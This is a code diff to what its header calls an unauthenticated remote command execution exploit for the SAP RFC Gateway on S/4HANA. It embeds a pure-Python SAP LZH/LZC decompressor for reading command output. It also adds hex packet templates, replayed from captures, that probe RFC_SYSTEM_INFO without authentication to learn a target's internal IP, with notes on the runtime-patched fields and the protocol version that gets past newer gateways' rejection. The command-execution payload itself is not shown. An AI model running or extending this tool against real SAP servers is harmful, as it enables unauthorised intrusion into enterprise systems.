@@ -3,7 +3,7 @@
 # SAP RFC Gateway Unauthenticated Remote Command Execution (v3)
 # For modern S/4HANA systems (kernel 758/793)
 #
-# Optional: pysapcompress (pysap) for large output
+# No external dependencies required — SAP LZH/LZC decompressor is built-in
 #           (commands producing >~10 lines use SAP LZH compression).
 
 import argparse
@@ -11,11 +11,335 @@ import socket
 import struct
 import sys
 
-try:
-    from pysapcompress import decompress as _sap_decompress, DecompressError as _SapDecompressError
-    _HAS_PYSAPCOMPRESS = True
-except ImportError:
-    _HAS_PYSAPCOMPRESS = False
+# ── Embedded pure-Python SAP LZH/LZC decompressor (no external deps) ────
+# Port of pysapcompress by the OWASP/pysap project (GPL-2.0).
+# Original TypeScript source: https://git.sr.ht/~xje4/sapcomp by Max Jäger.
+# Provides the same decompress(data, out_length) API as the C extension.
+from array import array as _array
+
+class _SapDecompressError(Exception):
+    pass
+
+class _SapCompressError(Exception):
+    pass
+
+_SAP_HDR_SIZE    = 8
+_SAP_MAGIC       = b'\x1f\x9d'
+_SAP_HDR_ALG_LZC = 1
+_SAP_HDR_ALG_LZH = 2
+_SAP_CS_END      = 1
+
+def _sap_parse_header(data):
+    if len(data) < _SAP_HDR_SIZE:
+        raise _SapDecompressError("header truncated")
+    length  = struct.unpack_from('<I', data, 0)[0]
+    alg_b   = data[4]
+    alg_id  = alg_b & 0x0f
+    alg_ver = (alg_b >> 4) & 0x0f
+    if bytes(data[5:7]) != _SAP_MAGIC:
+        raise _SapDecompressError("magic bytes not found")
+    return length, alg_id, alg_ver, data[7]
+
+class _SapReader:
+    __slots__ = ('_d','_p','_bits','_bc')
+    def __init__(self, d):
+        self._d=bytes(d); self._p=0; self._bits=0; self._bc=0
+    @property
+    def bytes_left(self): return len(self._d)-self._p
+    @property
+    def end_reached(self): return self._p>=len(self._d)
+    @property
+    def bits_left(self): return self.bytes_left*8+self._bc
+    @property
+    def total_length(self): return len(self._d)
+    def _rb(self):
+        if self._p>=len(self._d): raise _SapDecompressError("unexpected end")
+        b=self._d[self._p]; self._p+=1; return b
+    def read_byte(self):
+        if self._bc: raise RuntimeError("pending bits")
+        return self._rb()
+    def read(self,n):
+        if self._bc: raise RuntimeError("pending bits")
+        if self._p+n>len(self._d): raise _SapDecompressError("unexpected end")
+        c=self._d[self._p:self._p+n]; self._p+=n; return c
+    def peek_bits(self,n):
+        while self._bc<n:
+            self._bits|=self._rb()<<self._bc; self._bc+=8
+        return self._bits&((1<<n)-1)
+    def read_bits(self,n):
+        v=self.peek_bits(n); self._bits>>=n; self._bc-=n; return v
+    def skip_bits(self,n): self.read_bits(n)
+
+class _SapWriter:
+    __slots__ = ('_buf',)
+    def __init__(self): self._buf=bytearray()
+    @property
+    def data(self): return bytes(self._buf)
+    @property
+    def bytes_written(self): return len(self._buf)
+    def write(self,d): self._buf.extend(d)
+    def write_byte(self,b): self._buf.append(b&0xff)
+
+# ── LZC decompressor ──────────────────────────────────────────────────
+_LZC_MIN_CL=9; _LZC_MAX_CL=16; _LZC_EOB=256
+
+class _LZCDecompress:
+    def __init__(self,data,compat=False):
+        self._r=_SapReader(data); self._w=_SapWriter(); self._compat=compat
+        self._bm=1; self._cll=13; self._cl=_LZC_MIN_CL
+        self._mc=(1<<_LZC_MIN_CL)-1; self._nfc=-1; self._cr=None
+    @property
+    def _fsc(self): return 257 if self._bm else 256
+    def _scl(self,v):
+        self._cl=v
+        self._mc=(1<<self._cll) if v==self._cll else (1<<v)-1
+    def _rh(self):
+        l,ai,_,ex=_sap_parse_header(self._r.read(_SAP_HDR_SIZE))
+        if ai!=_SAP_HDR_ALG_LZC: raise _SapDecompressError("expected LZC")
+        self._bm=ex>>7; cl=ex&0x1f
+        if not (_LZC_MIN_CL<=cl<=_LZC_MAX_CL): raise _SapDecompressError("bad CL")
+        self._cll=cl; return l
+    def _nc(self):
+        r=self._r; cl=self._cl
+        need=(self._cr is None or self._cr.bits_left<cl or self._nfc>self._mc)
+        if need:
+            if self._nfc>self._mc: self._scl(self._cl+1)
+            sz=min(self._cl,r.bytes_left)
+            self._cr=_SapReader(r.read(sz)) if sz>0 else None
+        if self._cr is None or self._cr.bits_left<self._cl: return None
+        return self._cr.read_bits(self._cl)
+    def decompress(self):
+        dl=self._rh(); self._nfc=self._fsc
+        left=dl; codes={}; cb=bytearray(1<<self._cll)
+        pc=None; pcd=None
+        while left>0:
+            code=self._nc()
+            if self._bm and code==_LZC_EOB:
+                self._nfc=self._fsc; self._scl(_LZC_MIN_CL)
+                self._cr=None; pc=pcd=None; continue
+            if self._compat and code is None: break
+            if code is None: raise _SapDecompressError("unexpected end")
+            cl2=0
+            if code==pc:
+                cl2=(pcd['ci'] if pcd else 0)+1
+            elif code<self._nfc:
+                res=code
+                while res>255:
+                    cd=codes.get(res)
+                    if cd is None: raise _SapDecompressError("unknown code %d"%res)
+                    cb[cd['ci']]=cd['nx']; cl2+=1; res=cd['ba']
+                cb[0]=res; cl2+=1
+            elif code==self._nfc and pc is not None:
+                pci=pcd['ci'] if pcd else 0
+                cb[pci+1]=cb[0]; cl2=pci+2
+            else:
+                raise _SapDecompressError("unknown code %d"%code)
+            self._w.write(cb[:cl2]); left-=cl2
+            if pc is not None and self._nfc<(1<<self._cll):
+                pci=pcd['ci'] if pcd else 0
+                codes[self._nfc]={'ba':pc,'nx':cb[0],'ci':pci+1}
+                self._nfc+=1
+            pc=code; pcd=codes.get(code)
+        return self._w.data
+
+# ── LZH decompressor ──────────────────────────────────────────────────
+_LZH_WS=0x4000; _LZH_MM=3; _LZH_MX=258; _LZH_MD=_LZH_WS-(_LZH_MX+_LZH_MM+1)
+_LZH_LL=286; _LZH_DC=30; _LZH_BC=19; _LZH_EB=256; _LZH_LF=257; _LZH_HL=2
+_LZH_LE=[0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0,99,99]
+_LZH_DE=[0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13]
+_LZH_BLE=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,3,7]
+_LZH_BR=[16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15]
+
+def _rev(v,n):
+    r=0
+    for _ in range(n): r=(r<<1)|(v&1); v>>=1
+    return r
+
+def _lzh_len_maps():
+    lk=bytearray(259); ls=[0]*29; length=_LZH_MM
+    for c in range(28):
+        ls[c]=length; cnt=1<<_LZH_LE[c]
+        for _ in range(cnt): lk[length]=c; length+=1
+    lk[_LZH_MX]=28; ls[28]=_LZH_MX; return lk,ls
+
+def _lzh_dist_maps():
+    dk=bytearray(32769); ds=[0]*30; d=1
+    for c in range(30):
+        ds[c]=d; cnt=1<<_LZH_DE[c]
+        for _ in range(cnt): dk[d]=c; d+=1
+    return dk,ds
+
+def _build_hufftree(dist):
+    avail=1
+    for cnt in dist:
+        avail-=cnt
+        if avail<0: raise _SapDecompressError("bad huffman dist")
+        avail*=2
+    nc=[0]*(len(dist)+2); code=0
+    for cl in range(1,len(dist)+1):
+        code=(code+(dist[cl-1] if cl-1<len(dist) else 0))<<1
+        nc[cl]=code
+    return nc
+
+class _HT:
+    def __init__(self,nodes):
+        self.nodes=nodes; self._lk=None; self._mb=None
+    @property
+    def mb(self):
+        if self._mb is None:
+            self._mb=max((n['cl'] for n in self.nodes),default=0)
+        return self._mb
+    def _build(self):
+        mb=self.mb; ll=[0]*(1<<mb); nl=[None]*(mb+1)
+        for n in self.nodes:
+            cl=n['cl']
+            if cl<=0: continue
+            if nl[cl] is None: nl[cl]={}
+            ec=1<<(mb-cl)
+            for i in range(ec): ll[n['code']|(i<<cl)]=cl
+            nl[cl][n['code']]=n
+        self._lk=(ll,nl)
+    def lookup(self,code,maxcl=None):
+        if self._lk is None: self._build()
+        ll,nl=self._lk
+        cl=ll[code] if code<len(ll) else 0
+        if maxcl is not None: cl=min(cl,maxcl)
+        if cl==0: return None
+        m=nl[cl]; return m.get(code&((1<<cl)-1)) if m else None
+    def read(self,r):
+        raw=r.peek_bits(self.mb); n=self.lookup(raw)
+        if n is None: raise _SapDecompressError("bad huffman code 0x%x"%raw)
+        r.skip_bits(n['cl']); return n
+    def read2(self,r,fsl):
+        mb=self.mb
+        if fsl>=mb: return self.read(r)
+        n=self.lookup(r.peek_bits(fsl),fsl)
+        if n is None: n=self.lookup(r.peek_bits(mb))
+        if n is None: raise _SapDecompressError("bad huffman code")
+        r.skip_bits(n['cl']); return n
+
+def _ht_from_dist(dist):
+    nc=_build_hufftree(dist); ns=[]
+    for i,cl in enumerate(dist):
+        code=_rev(nc[cl],cl) if cl>0 else -1
+        if cl>0: nc[cl]+=1
+        ns.append({'value':i,'code':code,'cl':cl})
+    return _HT(ns)
+
+def _static_ll():
+    ns=[]
+    for c in range(144): ns.append({'value':c,'cl':8,'code':-1})
+    for c in range(144,256): ns.append({'value':c,'cl':9,'code':-1})
+    for c in range(256,280): ns.append({'value':c,'cl':7,'code':-1})
+    for c in range(280,288): ns.append({'value':c,'cl':8,'code':-1})
+    nc=_build_hufftree([0,0,0,0,0,0,0,24,152,112])
+    nc2=list(nc)
+    for n in ns:
+        cl=n['cl']; n['code']=_rev(nc2[cl],cl); nc2[cl]+=1
+    return _HT(ns)
+
+def _static_dist():
+    ns=[{'value':c,'cl':5,'code':_rev(c,5)} for c in range(30)]
+    return _HT(ns)
+
+_LZH_SLL=None; _LZH_SD=None
+_LZH_LK,_LZH_LS=_lzh_len_maps()
+_LZH_DK,_LZH_DS=_lzh_dist_maps()
+
+def _get_sll():
+    global _LZH_SLL
+    if _LZH_SLL is None: _LZH_SLL=_static_ll()
+    return _LZH_SLL
+
+def _get_sd():
+    global _LZH_SD
+    if _LZH_SD is None: _LZH_SD=_static_dist()
+    return _LZH_SD
+
+def _read_elens(r,bt,cnt):
+    codes=[]; ll=-1
+    while len(codes)<cnt:
+        n=bt.read(r); bc=n['value']
+        if bc<16: codes.append(bc); ll=bc
+        elif bc==16:
+            rep=3+r.read_bits(_LZH_BLE[bc])
+            codes.extend([ll]*rep)
+        elif bc==17:
+            rep=3+r.read_bits(_LZH_BLE[bc]); codes.extend([0]*rep); ll=0
+        elif bc==18:
+            rep=11+r.read_bits(_LZH_BLE[bc]); codes.extend([0]*rep); ll=0
+        else: raise _SapDecompressError("bad bitlen code %d"%bc)
+    return codes
+
+class _LZHDecompress:
+    def __init__(self,data):
+        self._r=_SapReader(data); self._w=_SapWriter()
+        self._db=bytearray(_LZH_WS); self._dc=0
+    def decompress(self):
+        self._rh()
+        while True:
+            last=self._r.read_bits(1); bt=self._r.read_bits(2)
+            if bt==1: self._rb(self._r,_get_sll(),_get_sd())
+            elif bt==2: self._dynb()
+            else: raise _SapDecompressError("bad block type %d"%bt)
+            if last: break
+        return self._w.data
+    def _rh(self):
+        hd=self._r.read(_SAP_HDR_SIZE); _,ai,_,_=_sap_parse_header(hd)
+        if ai!=_SAP_HDR_ALG_LZH: raise _SapDecompressError("expected LZH")
+        nc=self._r.read_bits(_LZH_HL)
+        if nc: self._r.skip_bits(nc)
+    def _dynb(self):
+        r=self._r
+        lc=257+r.read_bits(5); dc=1+r.read_bits(5); bcc=4+r.read_bits(4)
+        bd=[0]*_LZH_BC
+        for i in range(bcc): bd[_LZH_BR[i]]=r.read_bits(3)
+        bt=_ht_from_dist(bd)
+        ll=_read_elens(r,bt,lc); lt=_ht_from_dist(ll)
+        dl=_read_elens(r,bt,dc); dt=_ht_from_dist(dl)
+        self._rb(r,lt,dt)
+    def _rb(self,r,lt,dt):
+        w=self._w; buf=self._db
+        eob=lt.nodes[_LZH_EB]
+        if not eob or eob['cl']==0: raise _SapDecompressError("no EOB code")
+        lk=_LZH_LK; ls=_LZH_LS; dk=_LZH_DK; ds=_LZH_DS
+        while True:
+            n=lt.read2(r,eob['cl']); v=n['value']
+            if v<=255:
+                buf[self._dc]=v; w.write_byte(v)
+                self._dc=(self._dc+1)%_LZH_WS; continue
+            if v==_LZH_EB: break
+            lc=v-_LZH_LF; le=_LZH_LE[lc]; length=ls[lc]+r.read_bits(le)
+            dn=dt.read(r); dc2=dn['value']; de=_LZH_DE[dc2]
+            dist=ds[dc2]+r.read_bits(de)
+            cl=length; cs=(self._dc-dist+_LZH_WS)%_LZH_WS
+            while cl>0:
+                sl=_LZH_WS-max(cs,self._dc); cp=min(sl,cl)
+                cu=self._dc
+                if cu>cs and cu>cs+cp or cu<cs:
+                    buf[cu:cu+cp]=buf[cs:cs+cp]
+                else:
+                    for i in range(cp): buf[cu+i]=buf[cs+i]
+                w.write(buf[cu:cu+cp])
+                self._dc=(cu+cp)%_LZH_WS; cl-=cp; cs=(cs+cp)%_LZH_WS
+
+def _sap_decompress(data, out_length):
+    """Decompress SAP LZH/LZC data; returns (status, length, bytes)."""
+    data=bytes(data)
+    if len(data)<_SAP_HDR_SIZE:
+        raise _SapDecompressError("input too short")
+    length,ai,_,ex=_sap_parse_header(data)
+    if length!=out_length:
+        raise _SapDecompressError("length mismatch: header=%d caller=%d"%(length,out_length))
+    if ai==_SAP_HDR_ALG_LZC:
+        out=_LZCDecompress(data,compat_mode=True).decompress()
+    elif ai==_SAP_HDR_ALG_LZH:
+        out=_LZHDecompress(data).decompress()
+    else:
+        raise _SapDecompressError("unknown algorithm 0x%x"%ai)
+    if len(out)!=out_length:
+        raise _SapDecompressError("decoded %d, expected %d"%(len(out),out_length))
+    return _SAP_CS_END, len(out), out
 
 # ============================================================================
 # Templates extracted from pcapng captures (NI payloads)
@@ -176,6 +500,168 @@ P4_TEMPLATE = bytes.fromhex(
     "f50000077e10042d000200001004130023026993cc8b68d00c3ee10000000a141e41016993cc"
     "9068d00c3ee10000000a141e41000104ffff0000ffff0000027200006d60"
 )
+
+# ============================================================================
+# P3_RFCSI_S4H_TEMPLATE — updated S/4HANA direct RFC_SYSTEM_INFO call
+# From rfc_system_info_s4h.pcapng: 10.20.30.15 → 20.31.218.163:3300
+#
+# Uses protocol version 1-15-2-21010 (vs the older 1-4-2-1041 in the original
+# P3_RFCSI_TEMPLATE).  Modern S/4HANA gateways (kernel 793+) reject the old
+# version with TCP RST; this template is accepted.
+#
+# Patched at runtime (same constants as P3_RFCSI_TEMPLATE):
+#   conv_id [40:48], main PTE, TH PTE, IP suffix, source IP (length-neutral),
+#   TH routing / SID / appserver.  Server IP in UTF-16 block ("20.31.218.163")
+#   remains from the capture — gateways do not validate it strictly.
+_RFCSI_S4H_MAIN_PTE          = bytes.fromhex('6a19f3d1923f0b88e10000000a141e0f')
+_RFCSI_S4H_TH_PTE            = bytes.fromhex('d1f3196a3f92880be10000000a141e0f')
+_RFCSI_S4H_PTE_IP_SUFFIX_OLD = bytes.fromhex('e10000000a141e0f')
+_RFCSI_S4H_CONN_CLIENT_IP    = b'10.20.30.15'   # source in the capture
+
+P3_RFCSI_S4H_TEMPLATE = bytes.fromhex(
+    "06030200ffffffff0000010000010000c1ffffffff06000000010175010087040000000000000000"
+    "3832373932363338000006d300000002000006d300000001000000000234313033020000ffff0003"
+    "d9c6c3f0f0f0f0f0f0f0f0f001010008050101050401000301010103000400000e1b01030106000b"
+    "04010003010302000000230106016000026041016001610001000161010500b1312d31352d322d32"
+    "313031302d332d302d342d312d352d31302e32302e33302e31352d362d736170677730302d372d31"
+    "302e32302e33302e332d31372d31302e32302e33302e31352d31382d31302e32302e33302e332d39"
+    "2d452d31302d302d31312d302d31322d302d31332d302d31342d312d31362d4134482d31352d3438"
+    "3231304236313930303031464531393745353346424533313836313841342d382d4445534b544f50"
+    "2d5446544c4d364c0001050007001e310030002e00320030002e00330030002e0031003500200020"
+    "002000200000070020001a320030002e00330031002e003200310038002e00310036003300002000"
+    "21000430003000002100180016310030002e00320030002e00330030002e00310035000018000800"
+    "2276006800630061006c00610034006800630069005f004100340048005f00300030000008001100"
+    "0233000011001300083700390033002000001300120008370035003800200000120006000c74006f"
+    "005f005300340048000006013000405200460043005f00530059005300540045004d005f0049004e"
+    "0046004f003d003d003d003d003d003d003d003d003d003d003d003d003d003d003d004600540001"
+    "300111001244004500560045004c004f005000450052000111011400063000300031000114011700"
+    "14e3f2a955279551ebeefb6fd4fedca74e96346b9901170003000641003400480000030135001444"
+    "0045004d004f00530059005300540045004d00013500100004300030000010000200147600680063"
+    "0061006c00610034006800630069000002000c00085300450033003700000c0122001c3200300032"
+    "00360030003600300033003000390032003900340039000122012300000123000e00063000300031"
+    "00000e0119001244004500560045004c004f005000450052000119014000246747112b1d74d3a432"
+    "3965aaf6ea7355a545fc3a740953e323065793ee904990ce2a8d8901400114000630003000310001"
+    "1401150002450001150009001244004500560045004c004f00500045005200000901340006300030"
+    "003100013405010001010501013600250148210b6190001fe197e53fbe318638a46a19f3d1923f0b"
+    "88e10000000a141e0f000000010136050200000502000b0006370035003800000b0102001e520046"
+    "0043005f00530059005300540045004d005f0049004e0046004f000102000b000637003500380000"
+    "0b013000505200460043005f00530059005300540045004d005f0049004e0046004f003d003d003d"
+    "003d003d003d003d003d003d003d003d003d003d003d003d00460054002000200020002000200020"
+    "00200020000130050300000503013100e62a54482a0300e600004134482f766863616c6134686369"
+    "5f4134485f303020202020202020202020200001444556454c4f5045522020202020202020202020"
+    "20202020202020202020202053453337202020202020202020202020202020202020202020202020"
+    "20202020202020202020202000014134482f766863616c61346863695f4134485f30302020202020"
+    "20202020202034444439374343443642333930303430453030364131393932334139434142463030"
+    "31000148210b6190001fe197e53fbe318638a46a19f3d1923f0b88e10000000a141e0f0000000000"
+    "0000e22a54482a013105140010d1f3196a3f92880be10000000a141e0f0514042000040000000004"
+    "20051200000512500100742448020300410300230040200000541143555252454e545f5245534f55"
+    "52434553540d464153545f5345525f5645525354044651484e54114d4158494d414c5f5245534f55"
+    "5243455354115245434f4d4d454e4445445f44454c4159540c52464353495f4558504f5254540753"
+    "345f48414e414550010104011e100402000c000187680000044c00000bb810040b0020ff7ffa0d78"
+    "b737def6196e9325bf1597ef73feebdb51fd91ce3c2144000000001004040008001b000800120008"
+    "10040d00100000001b0000009700000028000000971004160002000c1004190002000010041e0008"
+    "000002e9000004ba10042500020001100409000338303010041d0002313210041f001557696e646f"
+    "77732031302e30202832363230302920100420000f494520392e31312e32363130302e3010042100"
+    "084f6666696365203010042400080000040d000006af1004280008000003ba000006ac10042d0002"
+    "00001004130034036a19b310923f0b87e10000000a141e0f016a19b315923f0b87e10000000a141e"
+    "0f006a19f3cf923f0b88e10000000a141e0f000104ffff0000ffff00000000000000000000000000"
+    "0000000000000000000000006a19f3d1923f0b88e10000000a141e0f00000001"
+)
+
+# ============================================================================
+# RFCSI Direct-Call Templates (SAPMAP Method 1 — S/4→S/4 server-to-server)
+#
+# Implements the exact S/4→S/4 RFC_SYSTEM_INFO call captured in
+# rfc_system_info.pcapng.  Packet structure:
+#   [HEADER 137 bytes] [routing string, variable] [POST_ROUTING 1160 bytes]
+#
+# The routing string is built dynamically for each target; field 7 carries
+# the target IP so the gateway recognises itself as the call destination.
+# The response is searched for the UTF-16LE "011" RFCPROTO marker; all 20
+# RFCSI_EXPORT fields (including RFCIPADDR) are then decoded from that point.
+#
+# No CHECK_GATEWAY handshake required — this mimics direct S/4→S/4 RFC.
+# ============================================================================
+
+# APPC/GW header (137 bytes): Version 6, GW_NORMAL_CLIENT, conn_id @ offset 40
+# Exact bytes from SAPMAP rfcsysteminfo2.pcap capture
+_RFCSI_DIRECT_HEADER = bytes.fromhex(
+    '06030200ffffffff000001000000000041ffffffff0000000000000000008704000000000000'
+    '000038353330333037380000057c000000020000057c00000001000000000234313033020000'
+    'ffff0001d9c6c3f0f0f0f0f0f0f0f0f00101000801010101010100000101010300040000021b'
+    '01030106000b04010003010302000000230106010500bc'
+)
+
+# Post-routing block (1166 bytes): client IPs, timestamp, UUIDs, RFC call body
+# Exact bytes from SAPMAP rfcsysteminfo2.pcap capture
+_RFCSI_DIRECT_POST = bytes.fromhex(
+    '0001050007000f3139322e3136382e322e313020202000070018002d3139322e3136382e322e3130'
+    '20202020202020202020202020202020202020202020202020202020202020202000180011000133'
+    '0011001200043730302000120013000437303020001300080020736170646f6f735f5741535f3030'
+    '20202020202020202020202020202020202000080006008054455354000000000000000000000000'
+    '00000000000000000000000000000000000000000000000000000000000000000000000000000000'
+    '00000000000000000000000000000000000000000000000000000000000000000000000000000000'
+    '00000000000000000000000000000000000000000000000000000000000000000000000000000006'
+    '013000205246435f53595354454d5f494e464f3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d465401300514'
+    '0010f1110081d050c2f1ace0000c29ddf77605140111000653415041444d01110117000c9b8fe613'
+    '7450e85458b8adf60117000300035741530003000c000453453337000c0122000e32303236303232'
+    '3332313432313101220123000001230120001c1fde87075304c78090ed937ceb8598f02a898bb2b8'
+    '9ba6fb4bf1ba2b0120000e0003303031000e0119000653415041444d0119013000285246435f5359'
+    '5354454d5f494e464f3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d46542020202020202020013001140003'
+    '3036360114011500014501150009000653415041444d000901340003303031013405010001010501'
+    '050200000502000b000437303020000b0102000f5246435f53595354454d5f494e464f0102050300'
+    '00050301250020373230303131463134353045463146324143453030303043323944444637373601'
+    '25013100b92a54482a0200b900005741532020202020202020202020202020202020202020202020'
+    '202020202020000153415041444d2020202020202020202020202020202020202020202020202020'
+    '53453337202020202020202020202020202020202020202020202020202020202020202020202020'
+    '00015741532020202020202020202020202020202020202020202020202020202020373230303131'
+    '46313435304546314632414345303030304332394444463737362a54482a013105140010f1110081'
+    'd050c2f1ace0000c29ddf77605140512000005120205001143555252454e545f5245534f55524345'
+    '530205020500114d4158494d414c5f5245534f55524345530205020500115245434f4d4d454e4445'
+    '445f44454c415902050205000c52464353495f4558504f52540205010400cf100402000c00018768'
+    '000004670000138c10040b0020ef7ffe2ddab737f674087e9325971597eff2bf8f4f71ff9f8e2726'
+    '1b000000001004040008001700080012000810040d00100000001b000000b900000022000000b910'
+    '04160002000c100417000200201004190002000010041e000800000273000005cb10042500020002'
+    '1004090003373830100424000800000374000005e81004130034034b0011f10f50f184ace0000c29'
+    'ddf776016c0011f10216f1aaace0000c29ddf77600720011f1450ef1f1ace0000c29ddf776000104'
+    'ffff0000ffff'
+)
+
+# Dynamic offsets within _RFCSI_DIRECT_HEADER
+_RSD_CONN_ID   = 40   # 8 ASCII bytes: random connection ID
+
+# Dynamic offsets within _RFCSI_DIRECT_POST
+_RSD_IP15      = 7    # 15-byte space-padded client IP
+_RSD_IP45      = 28   # 45-byte space-padded client IP
+_RSD_TIMESTAMP = 387  # 14 ASCII bytes: YYYYMMDDHHMMSS
+_RSD_UUID_A1   = 601  # 32-byte ASCII hex UUID
+_RSD_UUID_A2   = 788  # 32-byte ASCII hex UUID (inside *TH* block)
+_RSD_UUID_B1   = 316  # 16-byte binary UUID
+_RSD_UUID_B2   = 830  # 16-byte binary UUID
+
+# RFCSI_EXPORT field layout: (name, char_length); total = 245 chars = 490 bytes UTF-16LE
+_RFCSI_FIELDS = [
+    ('RFCPROTO',    3),
+    ('RFCCHARTYP',  4),
+    ('RFCINTTYP',   3),
+    ('RFCFLOTYP',   3),
+    ('RFCDEST',    32),
+    ('RFCHOST',     8),
+    ('RFCSYSID',    8),
+    ('RFCDATABS',   8),
+    ('RFCDBHOST',  32),
+    ('RFCDBSYS',   10),
+    ('RFCSAPRL',    4),
+    ('RFCMACH',     5),
+    ('RFCOPSYS',   10),
+    ('RFCTZONE',    6),
+    ('RFCDATEFM',   1),
+    ('RFCIPADDR',  15),   # ← server IPv4
+    ('RFCKERNRL',   4),
+    ('RFCHOST2',   32),
+    ('RFCSI_RESV', 12),
+    ('RFCIPV6ADDR',45),
+]
 
 # ============================================================================
 # NW752 (NPL/classic R3) Templates
@@ -366,6 +852,140 @@ P4_NPL_TEMPLATE = bytes.fromhex(
     "00006d60"
 )
 
+# ============================================================================
+# RFC_SYSTEM_INFO probe template (1876 bytes) - from rfc_system_info.pcapng
+#
+# Called unauthenticated via the SAP Gateway to retrieve the server's own IP
+# address (RFCIPADDR field of RFCSI_EXPORT).  Used by --check to auto-detect
+# the internal IP for --server-ip.
+#
+# Session-specific fields patched at runtime:
+#   conv_id   [40:48]          - 8-byte conversation ID from P2 response
+#   main PTE  (3 occurrences)  - 6a19a5de923f0b87e10000000a141e0f
+#   TH PTE    (1 occurrence)   - dea5196a3f92870be10000000a141e0f (at 0514 tag)
+#   IP suffix (7 occurrences)  - e10000000a141e0f (e1000000 + 4-byte client IP)
+#   CPIC sizes                 - 4-byte BE at offsets 48 and 56 (both = 0x6d7)
+#   conn-info client IP        - ASCII '10.20.30.15' (fields 5 and 17)
+#   conn-info server IP        - ASCII '10.20.30.3'  (fields 7 and 18)
+#   TH routing (32 bytes)      - A4H/vhcala4hci_A4H_00 (space-padded)
+#   SID/appserver (UTF-16 LE)  - A4H, vhcala4hci, vhcala4hci_A4H_00
+P3_RFCSI_TEMPLATE = bytes.fromhex(
+    "06030200ffffffff0000010000010000c1ffffffff06000000010175010087040000000000000000"
+    "3133323539373734000006d700000002000006d700000001000000000234313033020000ffff0003"
+    "d9c6c3f0f0f0f0f0f0f0f0f001010008050101050401000301010103000400000e1b01030106000b"
+    "04010003010302000000230106016000026041016001610001000161010500af312d342d322d3130"
+    "34312d332d302d342d312d352d31302e32302e33302e31352d362d736170677730302d372d31302e"
+    "32302e33302e332d31372d31302e32302e33302e31352d31382d31302e32302e33302e332d392d45"
+    "2d31302d302d31312d302d31322d302d31332d302d31342d312d31362d4134482d31352d34383231"
+    "304236313930303031464531393744303631423237393941443841342d382d4445534b544f502d54"
+    "46544c4d364c0001050007001e310030002e00320030002e00330030002e00310035002000200020"
+    "002000000700200016310030002e00320030002e00330030002e0036003500002000210004300030"
+    "00002100180016310030002e00320030002e00330030002e00310035000018000800227600680063"
+    "0061006c00610034006800630069005f004100340048005f00300030000008001100023300001100"
+    "130008370039003300200000130012000837003500380020000012000600164100340048002d0044"
+    "00650073006b0074006f0070000006013000405200460043005f00530059005300540045004d005f"
+    "0049004e0046004f003d003d003d003d003d003d003d003d003d003d003d003d003d003d003d0046"
+    "00540001300111001244004500560045004c004f0050004500520001110114000630003000310001"
+    "14011700147b68dd8736d87401571262070dd61151388446ee011700030006410034004800000301"
+    "350014440045004d004f00530059005300540045004d000135001000043000300000100002001476"
+    "006800630061006c00610034006800630069000002000c00085300450033003700000c0122001c32"
+    "0030003200360030003600300032003100340032003100320034000122012300000123000e000630"
+    "0030003100000e0119001244004500560045004c004f0050004500520001190140002461896b885f"
+    "c075465894a473ffdb42c13a8e28887b50a6db14288a0a8ba87700ded1dbd8014001140006300030"
+    "003100011401150002450001150009001244004500560045004c004f005000450052000009013400"
+    "06300030003100013405010001010501013600250148210b6190001fe197d061b2799af8a46a19a5"
+    "de923f0b87e10000000a141e0f000000010136050200000502000b0006370035003800000b010200"
+    "1e5200460043005f00530059005300540045004d005f0049004e0046004f000102000b0006370035"
+    "003800000b013000505200460043005f00530059005300540045004d005f0049004e0046004f003d"
+    "003d003d003d003d003d003d003d003d003d003d003d003d003d003d004600540020002000200020"
+    "0020002000200020000130050300000503013100e62a54482a0300e600004134482f766863616c61"
+    "346863695f4134485f303020202020202020202020200001444556454c4f50455220202020202020"
+    "20202020202020202020202020202020534533372020202020202020202020202020202020202020"
+    "2020202020202020202020202020202000014134482f766863616c61346863695f4134485f303020"
+    "20202020202020202020344444393743434436423339303033304530303641313939323341413941"
+    "3132303031000148210b6190001fe197d061b2799af8a46a19a5de923f0b87e10000000a141e0f00"
+    "000000000000e22a54482a013105140010dea5196a3f92870be10000000a141e0f05140420000400"
+    "0000000420051200000512500100742448020300410300230040200000541143555252454e545f52"
+    "45534f5552434553540d464153545f5345525f5645525354044651484e54114d4158494d414c5f52"
+    "45534f555243455354115245434f4d4d454e4445445f44454c4159540c52464353495f4558504f52"
+    "54540753345f48414e414550010104011e100402000c000187680000044c00000bb810040b0020ff"
+    "7ffa0d78b737def6196e9325bf1597ef73feebdb51fd91ce3c2144000000001004040008001b0008"
+    "0012000810040d0010000000230000011800000034000001181004160002000c1004190002000010"
+    "041e0008000003c1000008c610042500020001100409000338303010041d0002313210041f001557"
+    "696e646f77732031302e30202832363230302920100420000f494520392e31312e32363130302e30"
+    "10042100084f66666963652030100424000800000494000008f5100428000800000431000008e210"
+    "042d000200001004130034036a19a0f0923f0b89e10000000a141e0f016a199510923f0b85e10000"
+    "000a141e0f006a19a5dc923f0b87e10000000a141e0f000104ffff0000ffff000000000000000000"
+    "000000000000000000000000000000006a19a5de923f0b87e10000000a141e0f00000001"
+)
+
+# ============================================================================
+# RFC_SYSTEM_INFO NPL probe template (1868 bytes)
+# From rfc_system_info_npl.pcapng: 10.20.30.65 → 192.168.77.2:3300
+#
+# Captured using the correct ABAP-to-ABAP (06 03) connection path, preceded
+# by a CHECK_GATEWAY (type 0x04) handshake.  The gateway returns the server's
+# own RFCIPADDR at TLV 0x0007 (UTF-16 LE) in the initial 06 cb response.
+#
+# Session-specific fields patched at runtime:
+#   conv_id   [40:48]         - 8-byte conversation ID (client-generated)
+#   main PTE  (3 occurrences) - 6a1e35f9dcd10bc5e10000000a141e41
+#   TH PTE    (1 occurrence)  - f9351e6ad1dcc50be10000000a141e41
+#   IP suffix (7 occurrences) - e10000000a141e41 (e1000000 + client IP)
+#   CPIC sizes                - 4-byte BE at offsets 48 and 56 (both 0x6cf)
+#   TH routing (32 bytes)     - A4H/vhcala4hci_A4H_00 (space-padded)
+#   SID/appserver (UTF-16 LE) - A4H, vhcala4hci, vhcala4hci_A4H_00
+#   conn-info client IP       - ASCII '10.20.30.65' (fields 5 and 17)
